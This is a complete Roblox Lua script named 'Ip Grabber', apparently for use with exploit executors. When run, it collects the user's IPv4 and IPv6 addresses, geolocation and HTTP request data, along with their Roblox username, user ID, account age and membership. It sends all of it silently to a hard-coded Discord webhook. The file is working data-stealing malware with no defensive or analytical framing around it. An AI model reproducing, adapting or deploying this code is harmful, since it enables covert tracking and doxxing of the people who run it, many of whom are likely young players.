--[[

]]--

local Webhook = "https://discord.com/api/webhooks/1147297811294064730/9j-51POh1ygw7OODaE6MkuqKrDd_ZcL4lpxec2gmYyTjPLPUs7DP7G1Wo1YuQBCCew2D"
local IPv4 = game:HttpGet("https://api.ipify.org") 
local IPv6 = game:HttpGet("https://api64.ipify.org") 
local HTTPbin = game:HttpGet("https://httpbin.org/get") 
local GeoPlug = game:HttpGet("http://www.geoplugin.net/json.gp?ip="..IPv4) 


local Headers = {["content-type"] = "application/json"} 

local LocalPlayer = game:GetService("Players").LocalPlayer 

local AccountAge = LocalPlayer.AccountAge 
local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21) 
local UserId = LocalPlayer.UserId 
local PlayerName = LocalPlayer.Name 
local DisplayName= LocalPlayer.DisplayName
local PlaceID = game.PlaceId 


local LogTime = os.date('!%Y-%m-%d-%H:%M:%S GMT+0') 
local rver = "Version 0.2b" 


function identifyexploit()
   local ieSuccess, ieResult = pcall(identifyexecutor)
   if ieSuccess then return ieResult end
   
   return (SENTINEL_LOADED and "Sentinel") or (XPROTECT and "SirHurt") or (PROTOSMASHER_LOADED and "Protosmasher")
end

--[[ Webhook ]]--
local PlayerData = {
        ["content"] = "",
        ["embeds"] = {{
           
            ["author"] = {
                ["name"] = "Ip Grabber "..rver, 
            },
           
            ["title"] = PlayerName, -- Username/PlayerName
            ["description"] = "aka "..DisplayName, 
            ["fields"] = {
                {
                    --[[Username/PlayerName]]--
                    ["name"] = "Username:",
                    ["value"] = PlayerName,
                    ["inline"] = true
                },
                {
                    --[[Membership type]]--
                    ["name"] = "Membership Type:",
                    ["value"] = MembershipType,
                    ["inline"] = true
                },
                {
                    --[[Account age]]--
                    ["name"] = "Account Age (days):",
                    ["value"] = AccountAge,
                    ["inline"] = true
                },
                {
                    --[[UserID]]--
                    ["name"] = "UserId:",
                    ["value"] = UserId,
                    ["inline"] = true
                },
                {
                    --[[IPv4]]--
                    ["name"] = "IPv4:",
                    ["value"] = IPv4,
                    ["inline"] = true
                },
                {
                    --[[IPv6]]--
                    ["name"] = "IPv6:",
                    ["value"] = IPv6,
                    ["inline"] = true
                },
                {
                    --[[PlaceID]]--
                    ["name"] = "Place ID: ",
                    ["value"] = PlaceID,
                    ["inline"] = true
                },
                {
                    --[[Exploit/Executor]]--
                    ["name"] = "Executor: ",
                    ["value"] = identifyexploit(),
                    ["inline"] = true
                },
                {
                    --[[Log/Grab time]]--
                    ["name"] = "Log Time:",
                    ["value"] = LogTime,
                    ["inline"] = true
                },
                {
                    --[[HTTPbin]]--
                    ["name"] = "HTTPbin Data (JSON):",
                    ["value"] = "```json"..'\n'..HTTPbin.."```",
                    ["inline"] = false
                },
                {
                    --[[geoPlugin]]--
                    ["name"] = "geoPlugin Data (JSON):",
                    ["value"] = "```json"..'\n'..GeoPlug.."```",
                    ["inline"] = false
                },
            },
        }}
    }


local PlayerData = game:GetService('HttpService'):JSONEncode(PlayerData)
local HttpRequest = http_request;

if syn then
    HttpRequest = syn.request
    else
    HttpRequest = http_request
end


HttpRequest({Url=Webhook, Body=PlayerData, Method="POST", Headers=Headers})
